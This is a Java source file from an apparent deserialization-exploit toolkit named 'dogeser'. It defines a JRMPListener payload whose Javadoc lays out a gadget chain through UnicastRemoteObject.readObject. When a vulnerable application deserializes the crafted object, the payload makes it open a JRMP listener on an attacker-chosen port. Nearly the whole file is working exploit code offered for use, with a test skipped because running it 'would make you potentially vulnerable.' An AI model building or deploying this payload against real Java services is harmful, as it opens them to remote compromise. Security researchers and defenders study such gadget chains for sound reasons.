package dogeser.payloads;


import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

import dogeser.payloads.annotation.Authors;
import dogeser.payloads.annotation.PayloadTest;
import dogeser.payloads.util.PayloadRunner;
import dogeser.payloads.util.Reflections;
import sun.rmi.server.ActivationGroupImpl;
import sun.rmi.server.UnicastServerRef;


/**
 * Gadget chain:
 * UnicastRemoteObject.readObject(ObjectInputStream) line: 235
 * UnicastRemoteObject.reexport() line: 266
 * UnicastRemoteObject.exportObject(Remote, int) line: 320
 * UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383
 * UnicastServerRef.exportObject(Remote, Object, boolean) line: 208
 * LiveRef.exportObject(Target) line: 147
 * TCPEndpoint.exportObject(Target) line: 411
 * TCPTransport.exportObject(Target) line: 249
 * TCPTransport.listen() line: 319
 *
 * Requires:
 * - JavaSE
 *
 * Argument:
 * - Port number to open listener to
 */
@SuppressWarnings ( {
    "restriction"
} )
@PayloadTest( skip = "This test would make you potentially vulnerable")
@dogeser.payloads.annotation.Authors({ Authors.MBECHLER })
public class JRMPListener extends dogeser.payloads.util.PayloadRunner implements ObjectPayload<UnicastRemoteObject> {

    public UnicastRemoteObject getObject ( final String command ) throws Exception {
        int jrmpPort = Integer.parseInt(command);
        UnicastRemoteObject uro = dogeser.payloads.util.Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[] {
            RemoteRef.class
        }, new Object[] {
            new UnicastServerRef(jrmpPort)
        });

        Reflections.getField(UnicastRemoteObject.class, "port").set(uro, jrmpPort);
        return uro;
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(JRMPListener.class, args);
    }
}
